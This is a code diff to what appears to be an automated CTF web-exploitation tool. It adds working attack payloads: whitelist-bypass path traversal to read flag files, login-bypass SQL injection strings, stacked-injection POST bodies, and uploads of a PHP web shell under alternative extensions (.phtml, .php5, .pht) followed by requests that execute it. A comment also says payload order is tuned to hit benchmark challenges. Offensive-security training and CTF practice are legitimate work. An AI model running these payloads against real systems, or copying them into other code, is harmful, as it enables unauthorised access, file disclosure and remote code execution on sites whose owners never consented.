@@ -434,7 +434,7 @@ class RouteStateMachine(ABC):
           - Max 30 seconds total per route (prevents slow targets from hanging)
           - Individual HTTP timeout is 8 seconds (not 15)
         """
-        MAX_STEPS_PER_ROUTE = 20
+        MAX_STEPS_PER_ROUTE = 30
         MAX_TIME_PER_ROUTE = 30.0
         route_start = time.time()
 
@@ -941,6 +941,42 @@ class LFIMachine(RouteStateMachine):
                 "extract_flag": True,
             },
         ]
+
+        # --- Whitelist bypass payloads (WarmUp-style) ---
+        # Pattern: file=source.php%253f/../../../../flag
+        # The double-encoded ? makes the whitelist check see "source.php" as prefix
+        # but the actual include path traverses to /flag
+        whitelist_files = ["source.php", "hint.php", "index.php"]
+        flag_targets = [
+            "/../../../../../flag",
+            "/../../../../../tmp/flag",
+            "/../../../../../ffffllllaaaagggg",
+            "/../../../../flag",
+            "/../../../../tmp/flag",
+        ]
+        for wf in whitelist_files:
+            for ft in flag_targets:
+                # Double-encoded ? (%253f)
+                payload = f"{wf}%253f{ft}"
+                steps.append({
+                    "name": f"whitelist_bypass_{wf}_{hash(ft) & 0xffff:x}",
+                    "description": f"白名单绕过: {wf}%253f + 路径穿越",
+                    "method": "GET",
+                    "path": base_path,
+                    "params": {param: payload},
+                    "extract_flag": True,
+                })
+                # Single-encoded ? (%3f)
+                payload2 = f"{wf}%3f{ft}"
+                steps.append({
+                    "name": f"whitelist_bypass2_{wf}_{hash(ft) & 0xffff:x}",
+                    "description": f"白名单绕过 (单编码): {wf}%3f + 路径穿越",
+                    "method": "GET",
+                    "path": base_path,
+                    "params": {param: payload2},
+                    "extract_flag": True,
+                })
+
         # If param is not 'path', also try with 'path' param (common in LFI challenges)
         if param != "path":
             steps.insert(4, {
@@ -1405,6 +1441,43 @@ class SQLiMachine(RouteStateMachine):
         base_path = urlparse(self.target_url).path or "/"
         steps = []
 
+        # --- Login form SQL injection FIRST (most common CTF pattern) ---
+        # These are the highest-priority steps because login form SQLi is
+        # the #1 most common Web CTF challenge type.
+        login_paths = ["/check.php", "/login.php", "/login", "/auth.php",
+                       "/verify.php", "/admin.php", base_path]
+        login_payloads = [
+            "admin' or '1'='1",
+            "admin' or 1=1-- -",
+            "admin' or 1=1#",
+            "' or '1'='1",
+            "' or 1=1-- -",
+            "1' or 1=1-- -",
+        ]
+        for lpath in login_paths[:3]:  # Top 3 paths
+            for payload in login_payloads[:3]:  # Top 3 payloads
+                steps.append({
+                    "name": f"login_sqli_{lpath.strip('/').replace('.','_') or 'root'}_{hash(payload) & 0xffff:x}",
+                    "description": f"登录万能密码 {lpath}: {payload[:20]}",
+                    "method": "GET",
+                    "path": lpath,
+                    "params": {"username": payload, "password": payload},
+                    "extract_flag": True,
+                })
+
+        # --- Stacked / special SQL injection (POST-based) ---
+        stacked_payloads = ["*,1", "1;set sql_mode=PIPES_AS_CONCAT;select 1", "*"]
+        for sp in stacked_payloads:
+            steps.append({
+                "name": f"stacked_post_{hash(sp) & 0xffff:x}",
+                "description": f"堆叠注入 POST query={sp[:30]}",
+                "method": "POST",
+                "path": base_path,
+                "data": f"query={sp}",
+                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
+                "extract_flag": True,
+            })
+
         # Always try the most common payloads first regardless of detected type
         # This ensures we hit the benchmark challenges even without perfect detection
 
@@ -1567,32 +1640,7 @@ class SQLiMachine(RouteStateMachine):
                 "extract_flag": True,
             })
 
-        # --- Login form SQL injection (common CTF pattern) ---
-        # Many CTF challenges have a login form at /check.php or /login.php
-        # with username/password fields vulnerable to SQL injection.
-        # The "万能密码" (universal password) bypass is the most common.
-        login_paths = ["/check.php", "/login.php", "/login", "/auth.php",
-                       "/verify.php", "/admin.php", base_path]
-        login_payloads = [
-            "admin' or '1'='1",
-            "admin' or 1=1-- -",
-            "admin' or 1=1#",
-            "' or '1'='1",
-            "' or 1=1-- -",
-            "1' or 1=1-- -",
-            "admin'-- -",
-            "admin' #",
-        ]
-        for lpath in login_paths:
-            for i, payload in enumerate(login_payloads[:3]):  # Top 3 per path
-                steps.append({
-                    "name": f"login_sqli_{lpath.strip('/').replace('.','_') or 'root'}_{i}",
-                    "description": f"登录表单万能密码 {lpath}: {payload[:20]}",
-                    "method": "GET",
-                    "path": lpath,
-                    "params": {"username": payload, "password": payload},
-                    "extract_flag": True,
-                })
+        # (Login form and stacked SQL steps are at the top of the list)
 
         return steps
 
@@ -2199,6 +2247,35 @@ class UploadMachine(RouteStateMachine):
             "path": "/uploads/shell.php",
             "extract_flag": True,
         })
+
+        # ---- Variant A2: Alternative PHP extensions (.phtml, .php5, .pht, .php3) ----
+        # Many servers block .php but allow these alternative extensions
+        for alt_ext in (".phtml", ".php5", ".pht", ".php3"):
+            fname = f"shell{alt_ext}"
+            steps.append({
+                "name": f"upload_{alt_ext.strip('.')}",
+                "description": f"替代后缀绕过: 上传 {fname}",
+                "method": "POST",
+                "path": self._upload_path,
+                "files": {"file": (fname, php_payload, "image/jpeg")},
+                "extract_flag": False,
+            })
+            # Also try with field name "uploaded" (common in CTF upload forms)
+            steps.append({
+                "name": f"upload_{alt_ext.strip('.')}_uploaded",
+                "description": f"替代后缀 (字段=uploaded): {fname}",
+                "method": "POST",
+                "path": self._upload_path,
+                "files": {"uploaded": (fname, php_payload, "image/jpeg")},
+                "extract_flag": False,
+            })
+            steps.append({
+                "name": f"access_{alt_ext.strip('.')}",
+                "description": f"访问 /upload/{fname}",
+                "method": "GET",
+                "path": f"/upload/{fname}",
+                "extract_flag": True,
+            })
 
         # ---- Variant B: Blacklist bypass via double extension ----
         # Some servers blacklist .php but allow .php.jpg; many also serve from
